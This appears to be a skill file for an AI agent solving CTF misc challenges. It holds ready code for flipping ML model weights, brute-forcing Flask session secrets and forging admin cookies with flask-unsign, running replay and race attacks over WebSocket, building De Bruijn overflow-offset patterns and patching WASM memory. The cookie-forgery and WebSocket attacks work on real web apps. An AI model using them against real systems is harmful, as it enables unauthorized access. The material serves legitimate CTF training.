---
name: misc-games-vms-2
description: "CTF misc challenges part 2. ML model weight perturbation and LoRA adapter attacks, Flask session secret brute-force and decode, WebSocket coordinate/state manipulation, De Bruijn sequence generation for format string or offset discovery, Brainfuck/esoteric VM instrumentation and tracing, WASM linear memory patching via JavaScript. Triggers: 'ml weight attack', 'flask session decode', 'websocket manipulation', 'de bruijn sequence', 'brainfuck ctf', 'esoteric vm', 'wasm memory patch', 'lora adapter merge', 'neural model poison', 'flask secret brute'."
---

# CTF Misc: Games, VMs & Models Part 2

ML weight attacks, Flask session, WebSocket, De Bruijn, Brainfuck, WASM.

---

## Phase 1: ML Model Weight Perturbation

```python
import torch
import numpy as np

def negate_weights_to_win(model_path, target_layer='fc.weight'):
    """
    If model performs binary classification for flag check:
    Negate weights of final layer to flip decision.
    """
    model = torch.load(model_path, map_location='cpu')
    state_dict = model.state_dict()

    # Flip the decision boundary
    state_dict[target_layer] = -state_dict[target_layer]
    if 'fc.bias' in state_dict:
        state_dict['fc.bias'] = -state_dict['fc.bias']

    model.load_state_dict(state_dict)
    return model

def lora_adapter_merge_attack(base_model, lora_adapter_path):
    """
    LoRA adapter: W' = W + alpha/r * A @ B
    If adapter gates flag access, merge without gate layer.
    """
    from peft import PeftModel

    # Load and inspect adapter config
    import json
    config = json.load(open(lora_adapter_path + '/adapter_config.json'))
    print(f"LoRA rank: {config.get('r')}, alpha: {config.get('lora_alpha')}")

    # Merge adapter into base model
    model = PeftModel.from_pretrained(base_model, lora_adapter_path)
    merged = model.merge_and_unload()

    # Now query merged model with crafted input
    return merged

def neural_encoder_collision(model, target_output, input_dim=128):
    """
    Find two inputs that produce same embedding (collision).
    Gradient descent to minimize distance.
    """
    x1 = torch.randn(1, input_dim, requires_grad=True)
    x2 = torch.randn(1, input_dim, requires_grad=True)
    opt = torch.optim.Adam([x2], lr=0.01)

    target = model(x1).detach()
    for _ in range(1000):
        opt.zero_grad()
        loss = torch.nn.MSELoss()(model(x2), target)
        loss.backward()
        opt.step()
        if loss.item() < 1e-6:
            break

    return x1.detach(), x2.detach()
```

---

## Phase 2: Flask Session Brute-Force & Decode

```bash
# Install:
pip install flask-unsign itsdangerous --break-system-packages

# Decode session without key:
flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOnRydWV9..."
# → {'logged_in': True}

# Brute-force secret key:
flask-unsign --unsign --cookie "<cookie>" --wordlist /usr/share/wordlists/rockyou.txt
flask-unsign --unsign --cookie "<cookie>" --wordlist custom_secrets.txt

# Forge session once key is known:
flask-unsign --sign --cookie "{'role': 'admin', 'user_id': 1}" --secret 'supersecret'
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'dev' --legacy

# If key is empty string (common CTF default):
flask-unsign --sign --cookie "{'admin': True}" --secret ''
```

```python
from itsdangerous import URLSafeTimedSerializer

def forge_flask_session(payload, secret, salt='cookie-session'):
    """Forge Flask session cookie."""
    s = URLSafeTimedSerializer(secret, salt=salt)
    return s.dumps(payload)

def decode_flask_session(cookie):
    """Decode Flask session without verification."""
    import base64, json, zlib
    parts = cookie.split('.')
    data = parts[0] + '=' * (-len(parts[0]) % 4)
    decoded = base64.urlsafe_b64decode(data)
    if decoded[:1] == b'.':
        decoded = zlib.decompress(decoded[1:])
    return json.loads(decoded)
```

---

## Phase 3: WebSocket State Manipulation

```python
import asyncio
import websockets
import json

async def websocket_exploit(uri):
    async with websockets.connect(uri) as ws:
        # First message: get state:
        msg = await ws.recv()
        state = json.loads(msg)
        print(f"Initial: {state}")

        # Pattern 1: Send invalid coordinate/position
        await ws.send(json.dumps({
            "action": "move",
            "x": -1,  # out of bounds
            "y": -1,
            "z": 9999999
        }))

        # Pattern 2: Replay old message to duplicate item
        old_msg = json.dumps({"action": "collect", "item_id": 1})
        for _ in range(100):
            await ws.send(old_msg)
            resp = await ws.recv()
            print(resp)

        # Pattern 3: Race condition: send win condition simultaneously
        tasks = [ws.send(json.dumps({"action": "claim_flag"})) for _ in range(50)]
        await asyncio.gather(*tasks)
        flag = await ws.recv()
        return flag

asyncio.run(websocket_exploit("ws://challenge.ctf/game"))
```

---

## Phase 4: De Bruijn Sequences

```python
def de_bruijn(alphabet, n):
    """Generate De Bruijn sequence of order n over given alphabet."""
    k = len(alphabet)
    a = [0] * k * n
    sequence = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p+1])
        else:
            a[t] = a[t-p]
            db(t+1, p)
            for j in range(a[t-p]+1, k):
                a[t] = j
                db(t+1, t)

    db(1, 1)
    return ''.join(alphabet[i] for i in sequence)

# Find offset in buffer overflow:
pattern = de_bruijn('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 4)
# Send pattern, read crash address, find offset:
crash_value = 0x41346341  # from crash
crash_bytes = crash_value.to_bytes(4, 'little')
crash_str = crash_bytes.decode('ascii', errors='replace')
offset = pattern.find(crash_str)
print(f"Offset: {offset}")

# For format strings: find stack index:
pattern_fmt = de_bruijn('ABCDE', 4)
# Send: AAAA%1$x.%2$x.%3$x... and look for 41414141 in output
```

---

## Phase 5: Brainfuck / Esoteric VM Instrumentation

```python
def bf_trace(program, input_data='', max_ops=1000000):
    """
    Execute Brainfuck with tracing.
    Returns execution trace for constraint solving.
    """
    tape = [0] * 30000
    ptr = 0
    ip = 0
    inp = iter(input_data.encode() if isinstance(input_data, str) else input_data)
    output = []
    trace = []
    loop_count = {}

    while ip < len(program) and len(trace) < max_ops:
        cmd = program[ip]
        state = {'ip': ip, 'ptr': ptr, 'tape[ptr]': tape[ptr]}

        if cmd == '>': ptr += 1
        elif cmd == '<': ptr -= 1
        elif cmd == '+': tape[ptr] = (tape[ptr] + 1) & 0xFF
        elif cmd == '-': tape[ptr] = (tape[ptr] - 1) & 0xFF
        elif cmd == '.': output.append(tape[ptr])
        elif cmd == ',': tape[ptr] = next(inp, 0)
        elif cmd == '[':
            if tape[ptr] == 0:
                depth = 1
                while depth:
                    ip += 1
                    if program[ip] == '[': depth += 1
                    elif program[ip] == ']': depth -= 1
        elif cmd == ']':
            if tape[ptr] != 0:
                depth = 1
                while depth:
                    ip -= 1
                    if program[ip] == ']': depth += 1
                    elif program[ip] == '[': depth -= 1

        trace.append(state)
        ip += 1

    return bytes(output), trace

# Symbolic execution for flag extraction:
from z3 import *
def bf_symbolic(program, flag_length):
    """Find flag input that produces target output."""
    flag = [BitVec(f'f{i}', 8) for i in range(flag_length)]
    # Interpret BF symbolically... (simplified: use trace-based approach)
    # Run with concrete values, compare output positions
    pass
```

---

## Phase 6: WASM Linear Memory Patching

```javascript
// WASM memory is linear: one contiguous ArrayBuffer
// Read/write directly from JavaScript wrapper

async function patchWasmMemory(wasmPath) {
    const buf = await fetch(wasmPath).then(r => r.arrayBuffer());
    const { instance } = await WebAssembly.instantiate(buf, {
        env: {
            memory: new WebAssembly.Memory({ initial: 256 })
        }
    });

    const mem = new Uint8Array(instance.exports.memory.buffer);

    // Dump string at known offset:
    function readString(offset, len=64) {
        return String.fromCharCode(...mem.slice(offset, offset + len))
            .replace(/\0.*/, '');
    }

    // Write value to patch check:
    function patchByte(offset, value) {
        mem[offset] = value;
    }

    // Find offset of check variable by binary pattern:
    function findPattern(pattern) {
        outer: for (let i = 0; i < mem.length; i++) {
            for (let j = 0; j < pattern.length; j++) {
                if (mem[i+j] !== pattern[j]) continue outer;
            }
            return i;
        }
        return -1;
    }

    // Read flag region:
    const flagOffset = findPattern([0x66, 0x6c, 0x61, 0x67]); // "flag"
    if (flagOffset >= 0) {
        console.log("Flag at:", flagOffset, readString(flagOffset, 50));
    }

    // Call exported check function with patched state:
    const result = instance.exports.checkFlag(0, 32);
    console.log("Check result:", result);

    return { mem, instance, readString, patchByte };
}

// Node.js version:
const fs = require('fs');
const wasm = fs.readFileSync('challenge.wasm');
WebAssembly.instantiate(wasm).then(({ instance }) => {
    const mem = new Uint8Array(instance.exports.memory.buffer);
    // Dump all printable strings:
    let str = '', results = [];
    for (let i = 0; i < mem.length; i++) {
        if (mem[i] >= 0x20 && mem[i] < 0x7f) str += String.fromCharCode(mem[i]);
        else if (str.length > 4) { results.push(str); str = ''; }
        else str = '';
    }
    console.log(results.filter(s => s.includes('CTF') || s.includes('flag')));
});
```

---

## Output

Save to `.omop/engagement/ctf/misc/`:
- `solve.py`: solver
- `flag.txt`: captured flag

## Next Phase

→ `ctf-misc-games-vms` for Part 1 (WASM minimax, Roblox, PyInstaller)
→ `ctf-misc-pyjails` for Python jail escapes
